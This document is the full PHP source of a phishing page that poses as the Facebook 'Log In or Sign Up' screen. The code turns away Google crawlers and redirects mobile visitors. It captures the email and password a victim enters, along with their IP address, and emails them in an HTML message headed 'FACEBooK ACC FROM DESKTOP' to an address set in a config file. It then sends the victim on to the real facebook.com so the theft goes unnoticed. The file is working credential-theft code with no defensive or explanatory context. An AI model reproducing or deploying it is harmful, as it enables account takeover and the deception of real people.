<?php

error_reporting(0); 

include("./inc/config.php");

include "./f.anti/antibots1.php";
include "./f.anti/antibots2.php";
include "./f.anti/antibots3.php";
include "./f.anti/antibots4.php";
include "./f.anti/antibots5.php";

/*-----------------------------------------------------------------------*/
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
/*-----------------------------------------------------------------------*/
function mobileDevice()
{
$type = $_SERVER['HTTP_USER_AGENT'];
if(strpos((string)$type, "Windows Phone") != false || strpos((string)$type, "iPhone") != false || strpos((string)$type, "Android") != false)
return true;
else
return false;
}
if(mobileDevice() == true)
header('Location: m.index.php');

$serbeselphp = $_POST['richa'];
if($serbeselphp != "") {
	$ip = getenv("REMOTE_ADDR");
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$uorp = $_POST['eml'];
	$passw = $_POST['pw'];
	
	$dt = "".date("r (T)")."";
	$m1 .= "
<!DOCTYPE html>
<html>
<head><meta charset='UTF-8'></head>
<body>
<blockquote style='background-color: white;border-radius: 4px;border: 1px solid rgb(209, 209, 209);box-shadow: rgba(0, 0, 0, 0.5) 0px 5px 15px;box-sizing: inherit;color: #3e3e3e;font-family: Verdana, sans-serif;font-size: 16px;height: 395.703;left: 212.5px;margin-left: auto;margin-right: auto;width: 670.016;width:480px;'>
<br>


<center>
<img border='0' data-original-height='662' data-original-width='800' height='165' src='https://ie.reachout.com/wp-content/uploads/2015/02/Facebook.png' width='200' />
<br>

<span style='background-color: white; color: #222222; white-space: pre-wrap;'><b><span style='font-family: &quot;verdana&quot; , sans-serif;'>

『Email』: $uorp<br>
『Password』: $passw<br> 


『IP』: geoiptool.com/?ip=$ip

</span></b></span>
<br><br><br>
<center>
</blockquote>

</body>
</html> \n";
	

	$b0 = " ⌈ FACEBooK ACC FROM DESKTOP !! ⌉ @ $dt From $ip";
	$b1 = "From: LOGINS  <LOGINS@EAZY.com>.\n";
	$b1 .= $_POST['eMailAdd']."\n";
	$b1 = "X-Mailer: PHP/".phpversion();
	$b1 .= "MIME-Version: 1.0\n";
	$b1 .= "Content-type: text/html; charset=UTF-8\n";



	mail($zb,$b0,$m1,$b1);
	
	
	 $act = "https://facebook.com";
	header( "refresh:0;url=$act" );


   }
   

?>
<head><meta charset="utf-8"><style></style><title id="pageTitle">Facebook - Log In or Sign Up</title><link rel="shortcut icon" href="./img/iRmz9lCMBD2.ico">
<link type="text/css" rel="stylesheet" href="./css/main.css">
</head>
<form id="login_form" action="" method="post" novalidate="1" onsubmit="">

<div id="pagelet_bluebar" data-referrer="pagelet_bluebar"><div id="blueBarDOMInspector"><div class="_53jh"><div class="loggedout_menubar_container"><div class="clearfix loggedout_menubar"><div class="lfloat _ohe"><h1><a href="" title="Home"><i class="fb_logo img sp_cdTC-VYAWtd sx_b8adf4"><u>Facebook</u></i></a></h1></div><div class="menu_login_container rfloat _ohf" data-testid="royal_login_form"><form id="login_form" action="" method="post"  onsubmit="">

<input type="hidden" name="richa" value="SNR20">

<table cellspacing="0" role="presentation"><tbody><tr><td class="html7magic"><label for="email">Email or Phone</label></td><td class="html7magic"><label for="pass">Password</label></td></tr><tr><td><input type="email" class="inputtext" name="eml" id="email" data-testid="royal_email"></td><td><input type="password" class="inputtext" name="pw" id="pass" data-testid="royal_pass"></td><td><label class="uiButton uiButtonConfirm" id="loginbutton" for="u_0_2"><input value="Log In" aria-label="Log In" data-testid="royal_login_button" type="submit" id="u_0_2"></label></td></tr><tr><td class="login_form_label_field"></td><td class="login_form_label_field"><div><a href="">Forgot account?</a></div></td></tr></tbody></table></form></div></div></div></div></div></div>

<img border="0" src="./img/bothe.PNG" style=";
    width: 100%;
">
